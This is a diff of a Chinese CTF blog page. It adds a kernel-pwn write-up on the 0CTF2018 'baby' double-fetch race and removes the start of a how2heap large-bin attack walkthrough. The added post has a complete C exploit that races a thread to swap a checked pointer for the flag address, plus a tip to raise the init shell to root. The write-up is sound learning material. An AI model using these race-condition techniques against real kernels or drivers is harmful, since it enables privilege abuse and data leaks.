@@ -150,6 +150,128 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="CoLin">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CoLin's BLOG">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-5/" class="post-title-link" itemprop="url">Kernel pwn 入门 (5)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-02-28 22:31:03" itemprop="dateCreated datePublished" datetime="2023-02-28T22:31:03+08:00">2023-02-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-03-01 11:30:34" itemprop="dateModified" datetime="2023-03-01T11:30:34+08:00">2023-03-01</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/kernel-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">kernel pwn 系列</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.8k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="条件竞争"><a class="markdownIt-Anchor" href="#条件竞争"></a> 条件竞争</h1>
+<p>在用户态pwn中有一类题型叫做条件竞争。当程序需要在不同时刻访问相同一块内存时，如果没有做好并发访问的限制和检查，就有可能会产生恶意数据或执行恶意代码。今天笔者就来分析一下内核态中的条件竞争，以一道经典的题辅助学习。</p>
+<h1 id="0ctf2018-babydouble-fetch"><a class="markdownIt-Anchor" href="#0ctf2018-babydouble-fetch"></a> 0CTF2018-baby（double fetch）</h1>
+<h2 id="step-1-分析程序与调试"><a class="markdownIt-Anchor" href="#step-1-分析程序与调试"></a> Step 1: 分析程序与调试</h2>
+<p>按照惯例，打开IDA。<br />
+<img src="1.png" alt="" /><br />
+这个模块实现的功能只有一个：ioctl。我们跟进到其调用的ioctl_impl函数看一下。<br />
+<img src="2.png" alt="" /><br />
+ioctl的指令码只有两种：0x6666和0x1337。当指令码为0x6666时，会打印出flag的地址。<br />
+当指令码为0x1337时，其会调用_chk_range_not_ok函数。一看名字就不难猜测，这是一个检查越界的函数：<br />
+<img src="3.png" alt="" /><br />
+上面的__CFADD__函数的功能是返回两个参数相加后的CF标志位。当两个参数相加在最高位产生进位时CF为1，否则为0。不难想到如果a1和a2相加产生进位，那么一定会导致越界溢出。传入的第三个参数应该是数组的末尾地址，后面要判断a1+a2是否大于v4。</p>
+<p>回到ioctl_impl函数，这里判断传入的第三个参数不能大于<code>*(_QWORD *)(__readgsqword((unsigned int)&amp;current_task) + 0x1358)</code>这个东西。那这个东西到底是多少呢，我们写一个简单的程序调用一下这个模块看看。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 22-7-23.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this is a universal function to print binary data from a char* array</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">        <span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">        <span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">        output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">        <span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/baby&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, main);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a);</span><br><span class="line">    ioctl(fd, <span class="number">0x6666</span>);</span><br><span class="line">    <span class="type">char</span> b[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    ioctl(fd, <span class="number">0x1337</span>, b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>不知道是什么原因，本题的内核没有办法直接下断点，也没有办法将断点下在用户态程序中。尝试了很长时间，才找到调试的方法：</p>
+<h3 id="重要内核模块调试方法"><a class="markdownIt-Anchor" href="#重要内核模块调试方法"></a> 重要：内核模块调试方法：</h3>
+<p>首先打开init文件，将权限改为root（即在启动sh的那一行把gid从1000改成0），然后启动内核输入lsmod命令获取到模块的加载地址。然后我们<strong>不用去管syscall到底调用了模块的什么函数，不用去管这个函数在什么地方，直接将断点下在输出的加载地址上。注意，其输出的地址是模块加载的起始地址，但依然可以发挥断点的作用。</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ # lsmod</span><br><span class="line">baby 16384 0 - Live 0xffffffffc02f8000 (OE)</span><br></pre></td></tr></table></figure>
+<p>如上面的输出，我们可以直接将断点下在0xffffffffc02f8000，而无需在其上加上ioctl函数的偏移，也可以起到断点的作用。（亲测有效）</p>
+<p>通过这种方式，我们成功调试漏洞模块，然后找到了<code>*(_QWORD *)(__readgsqword((unsigned int)&amp;current_task) + 0x1358)</code>的值到底是多少：0x7ffffffff000。这是用户态栈区的最高地址，因此只要我们传入的是一个不太大的地址，都是可以的。<br />
+<img src="4.png" alt="" /><br />
+再回去看一下反汇编，注意第一个检查中的第一个参数cmpStr应该是一个指针，而第二个检查中的第二个参数应该表示字符串的长度，这里是将地址的值和第二个参数相加，因此不难猜测。即使猜不出来，第三个检查应该就非常明显了，检查这里的值是否等于flag的长度。flag的长度为33。因此我们要传入的参数应该是一个结构体的地址，这个结构体的前8字节是一个char*指针，后面8字节是33。<br />
+<img src="5.png" alt="" /><br />
+在判断之后，会对传入的字符串进行检查，如果与flag相等则输出flag。这里就产生了竞争条件漏洞。</p>
+<p><font color=red><strong>如果在进行if判断的时候，我们的地址传入的是正常的用户态地址，而在执行后面的字符串比较时，这个地址就被改变到了flag处，会怎么样呢？显然模块会用flag去比较其自身，这样显然是相等的。然后flag就能够被输出。如果我们使用双线程，就可以和内核模块竞争字符串地址这块内存的访问。只要能够在这个时间窗口成功修改字符串地址，后面的检查就可以通过。因此简单点说，竞争条件就是“时间的活”。</strong></font></p>
+<p>在C语言中，我们使用pthread_create函数创建一个线程，可以让一个线程执行一个函数。具体的参数调用规则参见<a target="_blank" rel="noopener" href="https://blog.csdn.net/wushuomin/article/details/80051295?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165858376216782391822691%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=165858376216782391822691&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-80051295-null-null.142%5Ev33%5Econtrol,185%5Ev2%5Econtrol&amp;utm_term=pthread_create&amp;spm=1018.2226.3001.4187">资料</a>。</p>
+<p>因此我们写出exp：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 22-7-23.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">msg</span>&#123;</span></span><br><span class="line">    <span class="type">char</span>* buffer;</span><br><span class="line">    <span class="type">int</span> length;</span><br><span class="line">&#125;msg;</span><br><span class="line"><span class="type">size_t</span> flag_address;</span><br><span class="line"><span class="type">bool</span> success = <span class="literal">false</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WRITE_TIME 1000</span></span><br><span class="line">msg m;</span><br><span class="line"><span class="type">pthread_t</span> competition_thread;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">competition</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(!success)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;WRITE_TIME; i++)</span><br><span class="line">            m.buffer = flag_address;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/baby&quot;</span>, O_RDWR);</span><br><span class="line">    ioctl(fd, <span class="number">0x6666</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg | grep &#x27;flag&#x27; &gt; temp.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> file = open(<span class="string">&quot;/temp.txt&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="type">char</span> context[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(file, context, <span class="number">49</span>);</span><br><span class="line">    flag_address = strtoull(context + <span class="number">31</span>, <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line">    close(file);</span><br><span class="line"></span><br><span class="line">    m.buffer = context;</span><br><span class="line">    m.length = <span class="number">33</span>;</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;competition_thread, <span class="literal">NULL</span>, competition, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">while</span>(!success)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;WRITE_TIME; i++)&#123;</span><br><span class="line">            m.buffer = context;</span><br><span class="line">            ioctl(fd, <span class="number">0x1337</span>, &amp;m);</span><br><span class="line">        &#125;</span><br><span class="line">        system(<span class="string">&quot;dmesg | grep &#x27;flag&#x27; &gt; temp.txt&quot;</span>);</span><br><span class="line">        file = open(<span class="string">&quot;/temp.txt&quot;</span>, O_RDWR);</span><br><span class="line">        read(file, context, <span class="number">0x80</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(context, <span class="string">&quot;flag&#123;&quot;</span>) != <span class="literal">NULL</span>)</span><br><span class="line">            success = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, context);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>其中在规划两者竞争的时候需要注意应该如何写代码，我们应该让二者充分竞争，所以双方修改这一个地方的总次数最好不要相差太多，否则可能难以达到竞争的目的。<br />
+<img src="6.png" alt="" /><br />
+由此可见，本题中竞争条件的利用并不是很难，难就难在当我们拿到这一题时，我们应该怎样才能够发现这道题存在条件竞争漏洞。本题的条件竞争属于double fetch，它通常的流程是：检查代码首先访问某一块内存，确认数据没有问题后主要操作代码再一次访问同一块内存，显然当这块内存没有被上锁的情况下，中间的时间空当是可以被利用的，这种检查也是线程不安全的。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/Kernel-Pwn-%E5%85%A5%E9%97%A8-4/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1728,395 +1850,6 @@ Glibc版本：Ubuntu GLIBC 2.23-0ubuntu11.3</p>
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-4/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="CoLin">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CoLin's BLOG">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-4/" class="post-title-link" itemprop="url">how2heap 深入学习(4)</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-02-28 22:21:37" itemprop="dateCreated datePublished" datetime="2023-02-28T22:21:37+08:00">2023-02-28</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-03-01 11:31:11" itemprop="dateModified" datetime="2023-03-01T11:31:11+08:00">2023-03-01</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/glibc-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">glibc 系列</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>6.6k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>6 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>how2heap下载网址: <a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap">传送门</a><br />
-Glibc源码查看网址：<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.23/source">传送门</a><br />
-参考书籍：CTF竞赛权威指南-pwn篇</p>
-<p>测试环境：Ubuntu 16.04<br />
-Glibc版本：Ubuntu GLIBC 2.23-0ubuntu11.3</p>
-<p>本人在前几天成功进入校队，因此后面的更新应该短时间内不会中断。<br />
-按照顺序，本文分析glibc 2_23文件夹中的第12~16个源码<br />
-如果本文的分析有任何错漏之处，还请各位读者不吝赐教，不胜感激。</p>
-<h1 id="12-large_bin_attack"><a class="markdownIt-Anchor" href="#12-large_bin_attack"></a> 12. large_bin_attack</h1>
-<p>large_bin_attack可以用于在栈区写入一个较大的值。通常是为其他攻击方式做准备。</p>
-<p>首先，源码在栈区定义了两个变量stack_var1和stack_var2，类型为unsigned long。之后依次分配了大小为0x430(p1), 0x20, 0x510(p2), 0x20, 0x510(p3), 0x20大小的chunk。（0x20的chunk用于防止堆块合并）</p>
-<p>之后，释放p1和p2。此时unsorted bin的结构应为：</p>
-<p><code>unsorted bin head &lt;-&gt; p2 &lt;-&gt; p1</code></p>
-<p>然后，malloc一个0xa0大小的chunk，在此过程中，p2被转移到了large bins中，p1被切割，仍在unsorted bin中且为last_remainder。</p>
-<p>之后，释放p3。下面是释放p3之后的堆结构。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x603000</span><br><span class="line">Size: 0xa1</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x6030a0</span><br><span class="line">Size: 0x391</span><br><span class="line">fd: 0x7ffff7dd1b78</span><br><span class="line">bk: 0x6039a0</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x603430</span><br><span class="line">Size: 0x30</span><br><span class="line"></span><br><span class="line">Free chunk (largebins) | PREV_INUSE</span><br><span class="line">Addr: 0x603460</span><br><span class="line">Size: 0x511</span><br><span class="line">fd: 0x7ffff7dd1fa8</span><br><span class="line">bk: 0x7ffff7dd1fa8</span><br><span class="line">fd_nextsize: 0x603460</span><br><span class="line">bk_nextsize: 0x603460</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x603970</span><br><span class="line">Size: 0x30</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x6039a0</span><br><span class="line">Size: 0x511</span><br><span class="line">fd: 0x6030a0</span><br><span class="line">bk: 0x7ffff7dd1b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x603eb0</span><br><span class="line">Size: 0x30</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x603ee0</span><br><span class="line">Size: 0x20121</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x6039a0 —▸ 0x6030a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x6039a0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x500: 0x603460 —▸ 0x7ffff7dd1fa8 (main_arena+1160) ◂— 0x603460 /* &#x27;`4`&#x27; */</span><br></pre></td></tr></table></figure>
-<p>之后是漏洞部分。如果我们可以修改p2的控制字段。那么下面如此操作：</p>
-<p>将p2的size从0x511改小为0x3f1，fd和fd_nextsize改为0，bk改为<code>(unsigned long)(&amp;stack_var1-2)</code>，bk_nextsize改为<code>(unsigned long)(&amp;stack_var2-4)</code>，调试时stack_var1的地址为0x7fffffffe470，stack_var2的地址为0x7fffffffe478。那么(unsigned long)(&amp;stack_var1-2)的值就为0x7fffffffe460，(unsigned long)(&amp;stack_var2-4)的值就为0x7fffffffe458。</p>
-<p>修改之后，堆结构如下：</p>
